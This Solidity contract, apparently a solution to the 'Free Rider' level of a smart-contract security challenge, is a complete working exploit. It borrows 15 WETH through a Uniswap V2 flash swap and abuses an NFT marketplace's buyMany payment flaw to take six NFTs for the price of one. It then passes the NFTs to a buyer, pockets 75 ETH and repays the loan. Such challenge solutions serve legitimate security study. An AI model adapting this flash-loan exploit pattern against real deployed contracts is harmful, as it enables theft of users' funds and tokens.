// SPDX-License-Identifier: MIT

pragma solidity ^0.6.6;

import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "hardhat/console.sol";

interface NFT {
    function safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable;
}

interface Market {
    function token() external returns (NFT);

    function buyMany(uint256[] calldata tokenIds) external payable;
    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external;
}

contract FreeRiderAttacker {
    address immutable owner;
    address immutable factory;
    IWETH immutable WETH;
    Market immutable market;
    address immutable buyer;

    constructor(address _factory, address router, address _market, address _buyer) public {
        owner = msg.sender;
        factory = _factory;
        WETH = IWETH(IUniswapV2Router01(router).WETH());
        market = Market(_market);
        buyer = _buyer;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0 WETH
        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1 Token
        assert(msg.sender == IUniswapV2Factory(factory).getPair(token0, token1)); // ensure that msg.sender is a V2 pair
        
        require(tx.origin == owner);
        
        (bytes1 junk) = abi.decode(data, (bytes1));
        require(junk == 0x69);
        require(amount0 == 15 * 10**18); // We want to borrow 15 WETH
        require(amount1 == 0); // We don't want to borrow token

        // Convert WETH to ETH
        WETH.withdraw(amount0);

        // Buy 6 NFTs for the price of one
        // Marketplace will give us NFT + its ETH value
        uint256[] memory ids = new uint256[](6);
        for (uint256 i = 0; i < ids.length; i++) {
            ids[i] = i;
        }
        market.buyMany{value: 15*10**18}(ids);

        // Transfer NFTs to buyer
        NFT nft = market.token();
        for (uint256 i = 0; i < ids.length; i++) {
            nft.safeTransferFrom(address(this), buyer, i);
        }

        // We have won 90 - 15 ETH
        tx.origin.send(75*10**18);

        // Repay WETH loan plus 0.3% fee (on the input amount)
        WETH.deposit{value: amount0}();
        WETH.transfer(msg.sender, amount0*1000/997+1);
    }

    // Accept ETH from WETH contract
    receive() external payable {}

    // Accept NFT
    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes memory _data) public returns(bytes4)
    {
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
}
